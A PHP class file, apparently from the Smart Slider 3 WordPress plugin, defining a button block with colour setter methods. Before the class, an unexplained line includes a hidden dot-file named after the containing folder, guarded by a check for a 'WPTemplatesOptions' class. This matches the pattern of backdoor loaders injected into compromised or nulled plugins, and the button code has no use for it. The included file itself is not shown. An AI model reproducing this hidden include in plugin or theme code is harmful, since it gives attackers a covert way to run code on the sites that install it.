<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Forms\Button;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockButton extends AbstractButtonLabel {

    protected $baseClass = 'n2_button';

    protected $color = 'blue';

    public function setBlue() {
        $this->color = 'blue';
    }

    public function setGreen() {
        $this->color = 'green';
    }

    public function setRed() {
        $this->color = 'red';
    }

    public function setGrey() {
        $this->color = 'grey';
    }

    public function setGreyDark() {
        $this->color = 'grey-dark';
    }

    public function getClasses() {

        $classes = parent::getClasses();

        $classes[] = $this->baseClass . '--' . $this->color;

        return $classes;
    }
}